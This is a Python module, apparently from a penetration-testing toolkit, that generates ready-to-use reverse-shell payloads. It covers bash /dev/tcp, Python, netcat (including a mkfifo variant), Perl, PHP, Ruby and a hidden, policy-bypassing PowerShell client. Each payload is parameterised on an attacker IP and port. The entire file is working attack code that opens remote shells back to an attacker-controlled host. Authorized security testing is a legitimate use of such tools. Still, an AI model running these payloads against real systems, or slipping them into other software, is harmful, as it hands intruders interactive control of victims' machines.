"""Payload generation for reverse and bind shells."""

import logging

logger = logging.getLogger(__name__)


class ShellPayloads:
    """Generate shell payloads for different platforms."""

    @staticmethod
    def bash_reverse_shell(attacker_ip: str, attacker_port: int) -> str:
        """Generate bash reverse shell payload.

        Args:
            attacker_ip: Attacker IP address
            attacker_port: Attacker port

        Returns:
            Bash reverse shell command
        """
        return f"bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1"

    @staticmethod
    def python_reverse_shell(attacker_ip: str, attacker_port: int) -> str:
        """Generate Python reverse shell payload.

        Args:
            attacker_ip: Attacker IP address
            attacker_port: Attacker port

        Returns:
            Python reverse shell command
        """
        payload = (
            f"python -c 'import socket,subprocess,os;"
            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            f"s.connect((\"{attacker_ip}\",{attacker_port}));"
            f"os.dup2(s.fileno(),0);"
            f"os.dup2(s.fileno(),1);"
            f"os.dup2(s.fileno(),2);"
            f"subprocess.call([\"/bin/sh\",\"-i\"])'"
        )
        return payload

    @staticmethod
    def python3_reverse_shell(attacker_ip: str, attacker_port: int) -> str:
        """Generate Python3 reverse shell payload.

        Args:
            attacker_ip: Attacker IP address
            attacker_port: Attacker port

        Returns:
            Python3 reverse shell command
        """
        payload = (
            f"python3 -c 'import socket,subprocess,os;"
            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            f"s.connect((\"{attacker_ip}\",{attacker_port}));"
            f"os.dup2(s.fileno(),0);"
            f"os.dup2(s.fileno(),1);"
            f"os.dup2(s.fileno(),2);"
            f"subprocess.call([\"/bin/sh\",\"-i\"])'"
        )
        return payload

    @staticmethod
    def nc_reverse_shell(attacker_ip: str, attacker_port: int) -> str:
        """Generate netcat reverse shell payload.

        Args:
            attacker_ip: Attacker IP address
            attacker_port: Attacker port

        Returns:
            Netcat reverse shell command
        """
        return f"nc -e /bin/sh {attacker_ip} {attacker_port}"

    @staticmethod
    def nc_mkfifo_reverse_shell(attacker_ip: str, attacker_port: int) -> str:
        """Generate netcat mkfifo reverse shell payload (for nc without -e).

        Args:
            attacker_ip: Attacker IP address
            attacker_port: Attacker port

        Returns:
            Netcat mkfifo reverse shell command
        """
        return (
            f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|"
            f"nc {attacker_ip} {attacker_port} >/tmp/f"
        )

    @staticmethod
    def perl_reverse_shell(attacker_ip: str, attacker_port: int) -> str:
        """Generate Perl reverse shell payload.

        Args:
            attacker_ip: Attacker IP address
            attacker_port: Attacker port

        Returns:
            Perl reverse shell command
        """
        payload = (
            f"perl -e 'use Socket;"
            f"$i=\"{attacker_ip}\";"
            f"$p={attacker_port};"
            f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            f"if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");"
            f"open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}}'"
        )
        return payload

    @staticmethod
    def php_reverse_shell(attacker_ip: str, attacker_port: int) -> str:
        """Generate PHP reverse shell payload.

        Args:
            attacker_ip: Attacker IP address
            attacker_port: Attacker port

        Returns:
            PHP reverse shell command
        """
        payload = (
            f"php -r '$sock=fsockopen(\"{attacker_ip}\",{attacker_port});"
            f"exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        )
        return payload

    @staticmethod
    def ruby_reverse_shell(attacker_ip: str, attacker_port: int) -> str:
        """Generate Ruby reverse shell payload.

        Args:
            attacker_ip: Attacker IP address
            attacker_port: Attacker port

        Returns:
            Ruby reverse shell command
        """
        payload = (
            f"ruby -rsocket -e 'f=TCPSocket.open(\"{attacker_ip}\",{attacker_port}).to_i;"
            f"exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
        )
        return payload

    @staticmethod
    def powershell_reverse_shell(attacker_ip: str, attacker_port: int) -> str:
        """Generate PowerShell reverse shell payload.

        Args:
            attacker_ip: Attacker IP address
            attacker_port: Attacker port

        Returns:
            PowerShell reverse shell command
        """
        payload = (
            f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
            f"\"$client = New-Object System.Net.Sockets.TCPClient('{attacker_ip}',{attacker_port});"
            f"$stream = $client.GetStream();"
            f"[byte[]]$bytes = 0..65535|%{{0}};"
            f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{"
            f"$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
            f"$sendback = (iex $data 2>&1 | Out-String );"
            f"$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
            f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
            f"$stream.Write($sendbyte,0,$sendbyte.Length);"
            f"$stream.Flush()}};"
            f"$client.Close()\""
        )
        return payload

    @staticmethod
    def get_payload(
        payload_type: str,
        attacker_ip: str,
        attacker_port: int,
    ) -> str:
        """Get payload by type.

        Args:
            payload_type: Payload type (bash, python, nc, etc.)
            attacker_ip: Attacker IP address
            attacker_port: Attacker port

        Returns:
            Shell payload command

        Raises:
            ValueError: If payload type is unknown
        """
        payload_map = {
            "bash": ShellPayloads.bash_reverse_shell,
            "python": ShellPayloads.python_reverse_shell,
            "python3": ShellPayloads.python3_reverse_shell,
            "nc": ShellPayloads.nc_reverse_shell,
            "nc_mkfifo": ShellPayloads.nc_mkfifo_reverse_shell,
            "perl": ShellPayloads.perl_reverse_shell,
            "php": ShellPayloads.php_reverse_shell,
            "ruby": ShellPayloads.ruby_reverse_shell,
            "powershell": ShellPayloads.powershell_reverse_shell,
        }

        if payload_type not in payload_map:
            raise ValueError(
                f"Unknown payload type: {payload_type}. "
                f"Available: {', '.join(payload_map.keys())}"
            )

        return payload_map[payload_type](attacker_ip, attacker_port)
